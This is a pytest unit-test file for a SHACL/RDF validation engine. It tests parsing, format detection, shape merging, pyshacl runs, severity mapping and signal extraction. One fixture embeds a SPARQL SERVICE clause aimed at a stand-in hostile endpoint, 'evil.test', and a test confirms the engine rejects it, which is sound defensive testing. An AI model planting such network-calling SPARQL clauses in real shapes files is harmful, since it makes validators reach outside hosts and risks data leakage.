"""Unit tests for the pure SHACL engine functions.

These tests exercise ``validibot.validations.validators.shacl.engine``
directly — no Django models, no test database. They use tiny inline
Turtle fixtures so the test suite stays fast and the failures point at
the engine function, not at fixture loading.

The fixtures are deliberately minimal but exercise the same SHACL
constructs operators hit in real 223P work: ``sh:NodeShape``,
``sh:targetClass``, ``sh:minCount``, ``sh:datatype``, severity
declarations, and ``sh:SPARQLConstraint`` (for the ``advanced=True``
code path that ASHRAE 223P requires for medium-compatibility checks).
"""

from __future__ import annotations

import multiprocessing

import pytest
from django.test import override_settings
from rdflib import Graph

from validibot.submissions.constants import SubmissionFileType
from validibot.validations.constants import Severity
from validibot.validations.validators.shacl import engine

# Test data has 2 RDF triples (alice's type + name); break out as a
# constant so ruff PLR2004 doesn't fire on the magic-number comparison.
MIN_ALICE_TRIPLES = 2

# ════════════════════════════════════════════════════════════════════════════
# Inline Turtle fixtures
# ════════════════════════════════════════════════════════════════════════════

# Smallest credible shapes file: every Person must have at least one
# ``ex:name`` value. Mirrors the ``sh:MinCountConstraintComponent``
# pattern that fires most often in real 223P models (e.g. "every Damper
# must have at least one s223:actuatedByProperty").
SHAPES_PERSON_REQUIRES_NAME = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.com/> .

ex:PersonShape
    a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:property [
        sh:path ex:name ;
        sh:minCount 1 ;
        sh:message "Person needs a name." ;
    ] .
"""

# A data graph that *conforms* to the shape above.
DATA_PASSING = """
@prefix ex: <http://example.com/> .
ex:alice a ex:Person ; ex:name "Alice" .
"""

# A data graph that *violates* the shape (Bob has no name).
DATA_FAILING = """
@prefix ex: <http://example.com/> .
ex:bob a ex:Person .
"""

# Shapes file with a Warning severity, used to verify severity mapping.
SHAPES_WITH_WARNING = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.com/> .

ex:PersonShape
    a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:property [
        sh:path ex:nickname ;
        sh:minCount 1 ;
        sh:severity sh:Warning ;
        sh:message "Person should have a nickname (warning)." ;
    ] .
"""

# Data with the s223 namespace (so signal extraction can detect it).
DATA_WITH_S223 = """
@prefix s223: <http://data.ashrae.org/standard223#> .
@prefix ex: <http://example.com/> .
ex:ahu1 a s223:AirHandlingUnit .
"""

SHAPES_WITH_SPARQL_CONSTRAINT = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.com/> .

ex:PersonShape
    a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:sparql [
        sh:message "Person must be query-compatible." ;
        sh:select "SELECT $this WHERE { $this a ex:Person . }" ;
    ] .
"""

SHAPES_WITH_SERVICE_CONSTRAINT = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.com/> .

ex:PersonShape
    a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:sparql [
        sh:message "Do not exfiltrate." ;
        sh:select '''SELECT $this WHERE {
            SERVICE <https://evil.test/sparql> { ?s ?p ?o }
        }''' ;
    ] .
"""

SHAPES_WITH_JS_CONSTRAINT = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.com/> .

ex:PersonShape
    a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:js [
        sh:jsFunctionName "validate" ;
    ] .
"""


# ════════════════════════════════════════════════════════════════════════════
# parse_rdf
# ════════════════════════════════════════════════════════════════════════════


class TestParseRdf:
    """Verify :func:`engine.parse_rdf` handles valid + invalid input.

    Why this matters: parse failures are surfaced as ERROR findings,
    so the error message text needs to be useful enough that operators
    can fix the submitted file without reading rdflib internals.
    """

    def test_parses_valid_turtle(self):
        """Valid Turtle produces a Graph and no error message."""
        g, err = engine.parse_rdf(DATA_PASSING, "turtle")
        assert err is None
        assert g is not None
        assert len(g) >= MIN_ALICE_TRIPLES

    def test_empty_submission_returns_clear_error(self):
        """Empty string yields ``(None, "Submission is empty.")``.

        Operators sometimes drop empty files into the workflow by
        accident — we want a clear message rather than an opaque
        rdflib exception.
        """
        g, err = engine.parse_rdf("", "turtle")
        assert g is None
        assert err is not None
        assert "empty" in err.lower()

    def test_invalid_turtle_returns_error_message(self):
        """Malformed Turtle reports the format and the underlying error.

        Operators need to know which format the engine tried (Turtle
        vs JSON-LD vs RDF/XML) since the same bytes can parse in one
        format and fail in another.
        """
        g, err = engine.parse_rdf("this is not turtle <<<", "turtle")
        assert g is None
        assert err is not None
        assert "turtle" in err.lower()


# ════════════════════════════════════════════════════════════════════════════
# detect_serialization
# ════════════════════════════════════════════════════════════════════════════


class TestDetectSerialization:
    """Verify the explicit override > extension > file_type > default chain."""

    def test_explicit_override_wins(self):
        """When the operator sets submission_format, we honour it.

        Important: extension mismatch shouldn't override the operator's
        explicit choice — they may know better than the filename.
        """
        result = engine.detect_serialization(
            file_name="something.ttl",
            file_type=SubmissionFileType.JSON,
            explicit_format="jsonld",
        )
        assert result == "json-ld"

    def test_auto_falls_through_to_extension(self):
        """``explicit_format='auto'`` triggers extension-based detection."""
        result = engine.detect_serialization(
            file_name="model.ttl",
            file_type=SubmissionFileType.TEXT,
            explicit_format="auto",
        )
        assert result == "turtle"

    def test_extension_jsonld_detected(self):
        """``.jsonld`` extension maps to rdflib's "json-ld"."""
        result = engine.detect_serialization("model.jsonld", None, "auto")
        assert result == "json-ld"

    def test_extension_ntriples_detected(self):
        """``.nt`` extension maps to rdflib's N-Triples parser."""
        result = engine.detect_serialization("building.nt", None, "auto")
        assert result == "nt"

    def test_extension_nquads_detected(self):
        """``.nq`` extension maps to rdflib's N-Quads parser."""
        result = engine.detect_serialization("building.nq", None, "auto")
        assert result == "nquads"

    def test_file_type_xml_falls_back_to_rdf_xml(self):
        """No extension hint + XML file_type → RDF/XML.

        Validibot submissions sometimes come without filename
        information (e.g. CLI uploads), and we still want a defensible
        guess based on file_type.
        """
        result = engine.detect_serialization(None, SubmissionFileType.XML, "auto")
        assert result == "xml"

    def test_unknown_falls_back_to_turtle(self):
        """When all signals are unhelpful, default to Turtle.

        Turtle is the most common SHACL serialization, so it's the
        right "I don't know, take a guess" default.
        """
        result = engine.detect_serialization(None, None, "auto")
        assert result == "turtle"


# ════════════════════════════════════════════════════════════════════════════
# merge_shapes_and_ontologies
# ════════════════════════════════════════════════════════════════════════════


class TestMergeShapesAndOntologies:
    """Verify the library-default + step-extras merge contract.

    This is the seam between system step config (step ruleset only) and
    library custom validator config (default ruleset + step extras),
    so the merge ordering matters: library defaults come first, step
    layers on top, mirroring the assertion-merge pattern in
    ``BaseValidator.evaluate_assertions_for_stage``.
    """

    def test_only_step_shapes_returns_step_content(self):
        """When there's no library default, step shapes pass through."""
        shapes, ont, bundles = engine.merge_shapes_and_ontologies(
            default_shapes_text="",
            default_ontology_text="",
            default_bundled_standards=None,
            step_shapes_text="step shapes",
            step_ontology_text="step ontology",
            step_bundled_standards=["qudt-2.1"],
        )
        assert shapes == "step shapes"
        assert ont == "step ontology"
        assert bundles == ["qudt-2.1"]

    def test_only_default_shapes_returns_default_content(self):
        """When the step has no extras, the library default flows through."""
        shapes, ont, bundles = engine.merge_shapes_and_ontologies(
            default_shapes_text="library shapes",
            default_ontology_text="library ontology",
            default_bundled_standards=["brick-1.4"],
            step_shapes_text="",
            step_ontology_text="",
            step_bundled_standards=None,
        )
        assert shapes == "library shapes"
        assert ont == "library ontology"
        assert bundles == ["brick-1.4"]

    def test_both_present_default_first_step_second(self):
        """When both contribute, the library default comes first.

        This ordering matters because some SHACL features (like
        ``sh:targetClass`` overrides) resolve last-write-wins; putting
        the project-specific extras after the library means project
        overrides can refine library shapes.
        """
        shapes, _, _ = engine.merge_shapes_and_ontologies(
            default_shapes_text="LIBRARY",
            default_ontology_text="",
            default_bundled_standards=None,
            step_shapes_text="STEP",
            step_ontology_text="",
            step_bundled_standards=None,
        )
        assert shapes.startswith("LIBRARY")
        assert shapes.endswith("STEP")
        assert engine.FILE_SEPARATOR in shapes

    def test_step_bundled_standards_overrides_default(self):
        """Step-level bundled selection wins, even an explicit empty list.

        Operators need a way to opt OUT of a library default's bundled
        standards on a per-step basis (e.g. "this workflow doesn't need
        QUDT even though the library validator includes it").
        """
        _, _, bundles = engine.merge_shapes_and_ontologies(
            default_shapes_text="",
            default_ontology_text="",
            default_bundled_standards=["brick-1.4", "qudt-2.1"],
            step_shapes_text="",
            step_ontology_text="",
            step_bundled_standards=[],  # explicit opt-out
        )
        assert bundles == []

    def test_step_bundled_standards_none_inherits_default(self):
        """``None`` step bundles means inherit; only ``[]`` opts out.

        The None-vs-empty-list distinction is the difference between
        "I didn't say anything" and "I explicitly want zero bundles."
        """
        _, _, bundles = engine.merge_shapes_and_ontologies(
            default_shapes_text="",
            default_ontology_text="",
            default_bundled_standards=["brick-1.4"],
            step_shapes_text="",
            step_ontology_text="",
            step_bundled_standards=None,
        )
        assert bundles == ["brick-1.4"]


# ════════════════════════════════════════════════════════════════════════════
# load_bundled_standards
# ════════════════════════════════════════════════════════════════════════════


class TestLoadBundledStandards:
    """Verify the Phase 1 stub correctly warns about pending bundles.

    Phase 2 will replace this stub with real shape loading; for Phase 1
    the contract is "operator gets a clear warning that the bundle was
    requested but not yet shipped." If we silently skip, operators
    would think their bundled-standards selection was honoured when it
    wasn't.
    """

    def test_known_bundle_emits_warning(self):
        """Brick / QUDT are recognised; engine emits a Warning issue."""
        shapes, ont, warnings = engine.load_bundled_standards(["brick-1.4"])
        assert shapes == ""
        assert ont == ""
        assert len(warnings) == 1
        assert warnings[0].severity == Severity.WARNING
        assert "brick-1.4" in warnings[0].message
        assert warnings[0].code == "shacl.bundle_not_yet_shipped"

    def test_unknown_bundle_emits_distinct_warning(self):
        """Unknown bundle slug gets a different code so operators can
        distinguish "not shipped yet" from "you typed the wrong thing."
        """
        _, _, warnings = engine.load_bundled_standards(["made-up-bundle"])
        assert len(warnings) == 1
        assert warnings[0].code == "shacl.bundle_unknown"

    def test_empty_list_returns_no_warnings(self):
        """Operator who didn't opt into any bundle gets zero noise."""
        shapes, ont, warnings = engine.load_bundled_standards([])
        assert shapes == ""
        assert ont == ""
        assert warnings == []


# ════════════════════════════════════════════════════════════════════════════
# run_shacl_validation
# ════════════════════════════════════════════════════════════════════════════


class TestRunShaclValidation:
    """Verify the pyshacl integration: pass, fail, empty shapes.

    These are integration-flavoured tests (they actually invoke pyshacl
    end-to-end) but they live in the engine test file because the
    surface is a pure function — no Django models, no test database.
    """

    def test_passing_data_produces_empty_results(self):
        """A conforming data graph produces zero ``sh:ValidationResult``.

        Why we check via ``map_results_to_issues`` rather than the
        ``conforms`` flag: pyshacl treats Warnings + Infos as
        non-conformant by default, which doesn't match Validibot's
        "passed = no ERRORs" semantics. We compute issues separately.
        """
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        assert err is None
        issues = engine.map_results_to_issues(results)
        assert issues == []

    def test_failing_data_produces_error_finding(self):
        """Bob without a name produces a sh:Violation → Severity.ERROR."""
        data_graph, _ = engine.parse_rdf(DATA_FAILING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        assert err is None
        issues = engine.map_results_to_issues(results)
        assert len(issues) == 1
        assert issues[0].severity == Severity.ERROR
        # Verify the focus_node detail rode through to meta for
        # downstream display.
        assert "bob" in issues[0].meta["shacl_focus_node"].lower()

    def test_pyshacl_runner_works_inside_daemonic_worker_process(self):
        """Celery prefork workers mark task processes as daemonic.

        Python refuses to start ``multiprocessing.Process`` children from
        those task processes. The pySHACL isolation layer must therefore use a
        subprocess boundary so normal SHACL validations still run in Celery.
        """
        current_process = multiprocessing.current_process()
        original_config = current_process._config.copy()
        current_process._config["daemon"] = True
        try:
            data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
            results, err = engine.run_shacl_validation(
                data_graph,
                SHAPES_PERSON_REQUIRES_NAME,
                "",
                inference_mode="none",
                advanced_shacl=False,
            )
        finally:
            current_process._config.clear()
            current_process._config.update(original_config)

        assert err is None
        assert results is not None
        assert engine.map_results_to_issues(results) == []

    def test_empty_shapes_returns_clear_error(self):
        """No shapes at all → engine error, not silent pass.

        Without this, a library validator misconfigured with empty
        default_ruleset.rules_text would silently let every
        submission through, which would be worse than failing.
        """
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            "",
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        assert results is None
        assert err is not None
        assert "no shacl shapes" in err.lower()

    def test_warning_severity_maps_to_warning(self):
        """sh:Warning shapes produce Severity.WARNING (not ERROR).

        ASHRAE 223P uses Warning severity for "should have a label"
        constraints (66 NodeShapes mix Violation + Warning + Info), so
        Validibot must distinguish or the report would over-flag.
        """
        data_graph, _ = engine.parse_rdf(DATA_FAILING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_WITH_WARNING,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        assert err is None
        issues = engine.map_results_to_issues(results)
        assert len(issues) == 1
        assert issues[0].severity == Severity.WARNING

    @override_settings(SHACL_MAX_DATA_TRIPLES=1)
    def test_data_graph_triple_limit_fails_before_pyshacl(self):
        """Oversized submissions should fail before expensive SHACL execution."""

        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )

        assert results is None
        assert err is not None
        assert "triple" in err.lower()

    def test_advanced_construct_rejected_when_step_toggle_off(self):
        """Embedded SHACL SPARQL cannot run unless the step opted into it.

        This protects the basic-validator path from silently executing
        SHACL-AF content when an author uploads a mixed shape bundle.
        """
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_WITH_SPARQL_CONSTRAINT,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        assert results is None
        assert err is not None
        assert "advanced shacl" in err.lower()

    def test_advanced_construct_rejected_when_deployment_flag_off(self):
        """The deployment gate blocks SHACL-AF even if the step asks for it.

        Workflow authors are not enough of a trust boundary for cloud
        execution; operators must explicitly enable advanced features
        for isolated/trusted deployments.
        """
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_WITH_SPARQL_CONSTRAINT,
            "",
            inference_mode="none",
            advanced_shacl=True,
        )
        assert results is None
        assert err is not None
        assert "SHACL_ENABLE_ADVANCED_FEATURES" in err

    @override_settings(SHACL_ENABLE_ADVANCED_FEATURES=True)
    def test_embedded_sparql_service_rejected_even_when_advanced_allowed(self):
        """Advanced deployments still reject network-capable SPARQL clauses."""
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_WITH_SERVICE_CONSTRAINT,
            "",
            inference_mode="none",
            advanced_shacl=True,
        )
        assert results is None
        assert err is not None
        assert "SERVICE" in err

    def test_shacl_js_rejected_unconditionally(self):
        """SHACL-JS is executable code and is not part of the v1 surface."""
        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
        results, err = engine.run_shacl_validation(
            data_graph,
            SHAPES_WITH_JS_CONSTRAINT,
            "",
            inference_mode="none",
            advanced_shacl=True,
        )
        assert results is None
        assert err is not None
        assert "SHACL-JS" in err


# ════════════════════════════════════════════════════════════════════════════
# extract_signals
# ════════════════════════════════════════════════════════════════════════════


class TestExtractSignals:
    """Verify the ``o.*`` signal dict that workflow authors gate on with CEL."""

    def test_parse_failure_yields_minimal_signals(self):
        """Parse failure → parse_ok=False, no triples, no namespaces."""
        signals = engine.extract_signals(
            data_graph=None,
            results_graph=None,
            parse_ok=False,
            parse_serialization="turtle",
        )
        assert signals["parse_ok"] is False
        assert signals["triple_count"] == 0
        assert signals["namespaces_present"] == []
        assert signals["has_s223_namespace"] is False
        assert signals["shacl_total_count"] == 0

    def test_s223_namespace_detected(self):
        """When the data uses the s223 namespace, ``has_s223_namespace=True``.

        This is the cheapest signal for CEL gates like "did the
        contractor actually use 223P, or did they send us Brick
        formatted as 223P?".
        """
        data_graph, _ = engine.parse_rdf(DATA_WITH_S223, "turtle")
        signals = engine.extract_signals(
            data_graph=data_graph,
            results_graph=None,
            parse_ok=True,
            parse_serialization="turtle",
        )
        assert signals["has_s223_namespace"] is True
        assert engine.NS_S223 in signals["namespaces_present"]

    def test_shacl_counts_separated_by_severity(self):
        """Violation / Warning / Info counts are tracked separately.

        CEL assertions like ``o.shacl_violation_count == 0`` should
        ignore Warnings; Validibot reports both counts so the author
        can pick the right gate.
        """
        data_graph, _ = engine.parse_rdf(DATA_FAILING, "turtle")
        results, _ = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        signals = engine.extract_signals(
            data_graph=data_graph,
            results_graph=results,
            parse_ok=True,
            parse_serialization="turtle",
        )
        assert signals["shacl_violation_count"] == 1
        assert signals["shacl_warning_count"] == 0
        assert signals["shacl_total_count"] == 1


# ════════════════════════════════════════════════════════════════════════════
# map_results_to_issues — finding ordering
# ════════════════════════════════════════════════════════════════════════════


class TestMapResultsToIssues:
    """Verify finding mapping preserves SHACL detail and orders stably."""

    def test_finding_meta_carries_shacl_detail(self):
        """``meta`` includes focus_node, source_shape, constraint component.

        The step detail UI surfaces these via Validibot's existing
        finding renderer; missing meta would mean the report degrades
        to "something somewhere violated something."
        """
        data_graph, _ = engine.parse_rdf(DATA_FAILING, "turtle")
        results, _ = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        issues = engine.map_results_to_issues(results)
        assert len(issues) == 1
        meta = issues[0].meta
        assert "shacl_focus_node" in meta
        assert "shacl_source_shape" in meta
        assert "shacl_constraint_component" in meta
        assert "MinCount" in meta["shacl_constraint_component"]

    def test_ordering_is_stable(self):
        """Re-running map on the same graph produces the same order.

        Test assertions that depend on issue order would otherwise be
        flaky because rdflib graph traversal isn't ordered by default.
        """
        data_graph, _ = engine.parse_rdf(DATA_FAILING, "turtle")
        results, _ = engine.run_shacl_validation(
            data_graph,
            SHAPES_PERSON_REQUIRES_NAME,
            "",
            inference_mode="none",
            advanced_shacl=False,
        )
        first = engine.map_results_to_issues(results)
        second = engine.map_results_to_issues(results)
        assert [i.message for i in first] == [i.message for i in second]


# ════════════════════════════════════════════════════════════════════════════
# Sanity check the SHACL namespace detection helper
# ════════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    ("turtle", "expected_uri_present"),
    [
        (DATA_WITH_S223, engine.NS_S223),
        (DATA_PASSING, "http://example.com/"),
    ],
)
def test_collect_namespaces_finds_subject_namespace(turtle, expected_uri_present):
    """Smoke-test the namespace collection helper used by signal extraction.

    Lower-level helper test — confirms that namespace URIs are derived
    from any URIRef in any triple position (subject, predicate, object).
    """
    g = Graph()
    g.parse(data=turtle, format="turtle")
    namespaces = engine._collect_namespaces(g)
    assert expected_uri_present in namespaces
